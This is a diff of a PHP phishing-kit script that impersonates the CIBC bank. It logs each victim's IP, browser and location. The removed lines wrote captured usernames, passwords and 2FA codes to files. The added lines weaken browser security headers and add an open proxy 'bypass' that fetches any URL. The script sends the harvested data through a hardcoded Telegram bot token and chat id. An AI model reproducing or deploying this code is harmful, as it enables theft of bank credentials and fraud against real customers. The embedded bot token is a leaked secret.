@@ -1,35 +1,46 @@
-=
 <?php
-        include "/anti-bot/Bot-Spox.php";
-        include "/anti-bot/Dila_DZ.php";
-        include "/anti-bot/Fuck-you.php";
-        include "/anti-bot/index.php";
-        include "/anti-bot/IP-BlackList.php";
-        include "/anti-bot/new.php";
-        include "/anti-bot/proxyblock.php";
-        include "/anti-bot/whitelist.dat";
-        include "/anti-bot/#1.php";
-        include "/anti-bot/#2.php";
-        include "/anti-bot/#3.php";
-        include "/anti-bot/#4.php";
-        include "/anti-bot/#5.php";
-        include "/anti-bot/#6.php";
-        include "/anti-bot/#7.php";
-        include "/anti-bot/#8.php";
-        include "/anti-bot/#9.php";
-        include "/anti-bot/#10.php";
-        include "/anti-bot/#11.php";
-        include "/anti-bot/#12.php";
-        include "/anti-bot/antibot_host.php";
-        include "/anti-bot/antibot_ip.php";
-        include "/anti-bot/antibot_phishtank.php";
-        include "/anti-bot/antibot_proxy.php";
-        include "/anti-bot/antibot_userAgent.php";
+
+header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
+header("X-XSS-Protection: 0");
+header("X-Frame-Options: ALLOWALL");
+header("Access-Control-Allow-Origin: *");
+header("Access-Control-Allow-Credentials: true");
+header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
+header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");
+
+if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
+    $url = $_GET['url'];
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_HEADER, false);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
+        "X-XSS-Protection: 0",
+        "X-Frame-Options: ALLOWALL",
+        "Access-Control-Allow-Origin: *",
+        "Access-Control-Allow-Credentials: true",
+        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
+        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
+    ));
+    $response = curl_exec($ch);
+    $info = curl_getinfo($ch);
+    curl_close($ch);
+
+    header("HTTP/1.1 ".$info['http_code']);
+    foreach ($info['headers'] as $header) {
+        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
+            header($header);
+        }
+    }
+    echo $response;
+    exit;
+}
+
 $full_date = date("h:i:s|M/d/Y");
 $time = date("h:i:s");
 $date = date("M/d/Y");
-
-
 
 function get_client_ip()
 {
@@ -124,11 +135,9 @@ if (strpos($PublicIP, ',') !== false) {
     $PublicIP = explode(",", $PublicIP)[0];
 }
 
-$file       = '/data.dat';
-$file2      = '/data.dat';
-$file3      = '/data.dat';
-$file4      = '/data.dat';
-$file5      = '/data.dat';
+$file       = 'data.dat';
+$file1       = 'combo.txt';
+$file2       = 'master.log';
 $ip         = "".$PublicIP;
 $uaget      = "".$user_agent;
 $bsr        = "".$user_browser;
@@ -167,22 +176,14 @@ if ($success==false) {
     $crn        = $details['currency'];
     $type       = $tp;
     $bank       = "CIBC";
-
     $url        = "https://CIBC.com";
-    $user       = $_POST['username'];
-    $pass       = $_POST['password'];
-    $code       = $_POST['code']; 
-    $code2      = "[2FA][$code]";
-    $logo       = "[S-T-R|CR00K]";
-    $gitusr     = "[SWIF-T-RYNX]";
+	$lh     = "|";
     $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
     $isp        = $is;
     $currency   = "".$full_date;
-	$lh     = "|";
-        $li     = ",";
+    $li     = ",";
 
     
-
 } else {
     $status     = "Status : ".$success;
     fwrite($fp, $status."\n");
@@ -190,12 +191,7 @@ if ($success==false) {
     fclose($fp);
 }
 
-
-
-$message =" $bank$lh$ip\n\n-----------------\n\n$bsr$lh$uos\n\n-----------------\n\n$is\n\n-----------------\n\n$city$lh$country\n\n-----------------\n\n$la$li$lp\n\n-----------------\n\n$uaget";
-file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$user$li$pass$li$code\n", FILE_APPEND); 
-file_put_contents($file, "$message\n////[$date]////////[$time]////////////[$bank]//[TELEGRAM-LOG]//\n", FILE_APPEND);file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
-file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
+$message =" $bank$lh$ip\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$bsr$lh$uos\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$is\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$city$lh$country\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$la$li$lp\n\n\n[ + ]-----[SR]-----[ + ]\n\n\n$uaget";
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
     'chat_id' => '-821080105',
